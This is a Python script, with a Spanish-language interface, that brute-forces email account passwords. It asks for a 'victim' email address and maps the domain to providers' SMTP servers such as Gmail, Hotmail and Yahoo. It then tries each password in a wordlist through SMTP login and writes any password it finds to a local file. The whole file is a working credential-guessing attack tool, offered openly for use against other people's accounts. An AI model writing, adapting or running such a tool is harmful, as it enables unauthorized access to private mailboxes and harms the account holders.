# -*- coding: utf-8 -*-
#                                                               
#        `7MM'""YMM  `7MMM.     ,MMF' .g8'""bgd       `7MM      
#          MM    `7    MMMb    dPMM .dP'     `M         MM      
#          MM   d      M YM   ,M MM dM'       ``7Mb,od8 MM  ,MP'
#          MMmmMM      M  Mb  M' MM MM           MM' "' MM ;Y   
#          MM   Y  ,   M  YM.P'  MM MM.          MM     MM;Mm   
#          MM     ,M   M  `YM'   MM `Mb.     ,'  MM     MM `Mb. 
#        .JMMmmmmMMM .JML. `'  .JMML. `"bmmmd' .JMML. .JMML. YA.
#                                                               
#                                                  By: LawlietJH

from BannerEMCrk import Banner
import os.path as path
import smtplib
import time
import os


os.system('cls')


autor = "By: LawlietJH"
version = "v_1.0.6"

#GMCrk - Banner Random
banner = str(Banner()+"\n\n\t [-] Obten Contraseñas de Cuentas de Correos Por Fuerza Bruta [-] \n")
print (banner)

print(
"""    Servidores De Correos Soportados En Este Script:
                                                                        
    [*] gmail.com       [*] hotmail.com     [*] mail.com        [*] yahoo.com
    [*] ymail.com       [*] roketmail.com   [*] gmx.es          [*] zoho.com
    [*] aol.com         [*] fastmail.com    [*] hushmail.com    [*] live.com
    [*] inbox.com       [*] housemusic.com  [*] rediffmail.com  [*] web.de
    [*] verizon.net     [*] comcast.net     [*] upla.cl         [*] udec.cl
     +  Proximamente...
     
""")

def Correo():
	
	global nombSMTP
	global Usuario
	
	Usuario = input("\n\n [+] Dirección de Correo de la Victima: ")
	
	if Usuario.lower().endswith('@gmail.com'):
		nombSMTP = "smtp.gmail.com"
	elif Usuario.lower().endswith('@hotmail.com'):
		nombSMTP = "smtp.outlook.com"
	elif Usuario.lower().endswith('@zoho.com'):
		nombSMTP = "smtp.zoho.com"
	elif Usuario.lower().endswith('@gmx.es'):
		nombSMTP = "smtp.gmx.es"
	elif Usuario.lower().endswith('@live.com'):
		nombSMTP = "smtp.live.com"
	elif Usuario.lower().endswith('@mail.com'):
		nombSMTP = "smtp.mail.com"
	elif Usuario.lower().endswith('@aol.com'):
		nombSMTP = "smtp.aol.com"
	elif Usuario.lower().endswith('@fastmail.com'):
		nombSMTP = "smtp.fastmail.com"
	elif Usuario.lower().endswith('@hushmail.com'):
		nombSMTP = "smtp.hushmail.com"
	elif Usuario.lower().endswith('@inbox.com'):
		nombSMTP = "smtp.inbox.com"
	elif Usuario.lower().endswith(('@yahoo.com', '@roketmail.com', '@ymail.com')):
		nombSMTP = "smtp.mail.yahoo.com"
	elif Usuario.lower().endswith('@housemusic.com'):
		nombSMTP = "smtp.housemusic.com"
	elif Usuario.lower().endswith('@rediffmail.com'):
		nombSMTP = "smtp.rediffmail.com"
	elif Usuario.lower().endswith('@comcast.net'):
		nombSMTP = "smtp.comcast.net"
	elif Usuario.lower().endswith('@web.de'):
		nombSMTP = "smtp.web.de"
	elif Usuario.lower().endswith('@verizon.net'):
		nombSMTP = "smtp.verizon.net"
	elif Usuario.lower().endswith('@upla.cl'):
		nombSMTP = "smtp.upla.cl"
	elif Usuario.lower().endswith('@udec.cl'):
		nombSMTP = "smtp.udec.cl"
	else:
		print("\n\t\t [!] Correo No Válido.")
		os.system('Timeout /nobreak 02 > Nul')
		exit(0)
	

def Diccionario():
	
	global Archivo
	
	#Se Pide El Diccionario
	NombreA = input("\n [+] Preciona [Enter] o Pon Nombre Del Diccionario: ")


	#Comprobamos Si Existe El Diccionario
	if path.exists(NombreA):
		Archivo = NombreA
		
	elif NombreA == "":
		Archivo = "pwd.zion"
		print("\n\t [!] Se Usará El Diccionario Por Defecto: pwd.zion")
	
		if not path.exists("pwd.zion"):
			print("\n\t [!] No Se Ha Creado El Diccionario pwd.zion.")
			resp=input("\n\t [+] ¿Desea Crear Ahora? [S/N]: ")
			
			if resp == "S" or resp == "Si" or resp == "SI" or resp == "si" or resp == "s":
				print("\n\t [+] Se creará el archivo pwd.zion.")
				print("\n\t [+] Puedes añadirle palabras desde bloc de notas.")
				Zion=open("pwd.zion","w")
				Zion.close
				print("\n\n\t [*] Saliendo...")
				os.system('Timeout /nobreak 02 > Nul')
				exit(0)
			else:
				print("\n\n\t [*] Saliendo...")
				os.system('Timeout /nobreak 02 > Nul')
				exit(0)
				
	else:
		print("\n\t No se encontro el Diccionario: "+NombreA)
		print("\n\t [!] Se Usará El Diccionario Por Defecto: pwd.zion")
		Archivo = "pwd.zion"
		os.system('Timeout /nobreak 02 > Nul')
	
		if not path.exists("pwd.zion"):
			print("\n\t [!] No Se Ha Creado El Diccionario pwd.zion.")
			resp=input("\n\t [+] ¿Desea Crear Ahora? [S/N]: ")
		
			if resp == "S" or resp == "Si" or resp == "SI" or resp == "si" or resp == "s":
				print("\n\t [+] Se creará el archivo pwd.zion.")
				print("\n\t [+] Puedes añadirle palabras desde bloc de notas.")
				Zion=open("pwd.zion","w")
				Zion.close
				print("\n\n\t [*] Saliendo...")
				os.system('Timeout /nobreak 02 > Nul')
				exit(0)
			else:
				print("\n\n\t [*] Saliendo...")
				os.system('Timeout /nobreak 02 > Nul')
				exit(0)

def Conexion():
	
	global Archivo
	global Usuario
	
	#SMTP Puerto 587/TCP (Para Clientes de Correo). Otros SMTP: 25 y 645.
	smtpserver = smtplib.SMTP(str(nombSMTP), 587)
	smtpserver.ehlo()
	smtpserver.starttls()

	# Abrimos El Diccionario
	Archivo = open(Archivo, "r")


	print("\n\n [!] Intentando...\n\n\n")

	for Pwd in Archivo:
		try:
			smtpserver.login(Usuario, Pwd)
			print (" ------> [!] Contraseña Encontrada: " + str(Pwd))
			
			passwd=open('CC.zion','a')
			
			FechaF = time.strftime("\n\n\t [*] Fecha: %d/%m/%Y %H:%M:%S")
			xD="\n\t"+FechaF+\
			   "\n\t ------------------------------------------------- "+\
			   "\n\n\t [+] Correo: "+str(Usuario)+"\n\n\t [+] Contraseña: "+str(Pwd)+\
			   "\n\t ------------------------------------------------- "
			passwd.write(xD)
			passwd.close()
			print("\n\n\n\n\t [!] La Contraseña ha sido exitosamente encontrada.")
			print("\n\t [+] Fue Guardada En El Archivo CC.zion.")
			
			os.system('Timeout /nobreak 03 > Nul')
			exit(0)
		except smtplib.SMTPAuthenticationError:
			print ("\t [*] Contraseña Incorrecta: " + str(Pwd))
	

def main():
	
	Correo()
	Diccionario()
	print(time.strftime("\t [!] Iniciado: %d/%m/%Y %H:%M:%S"))
	Conexion()
	
	print ("\n\n\n\t\t [*] Vuelve a intentarlo...\n\n")
	os.system('Timeout /nobreak 03 > Nul')


main()
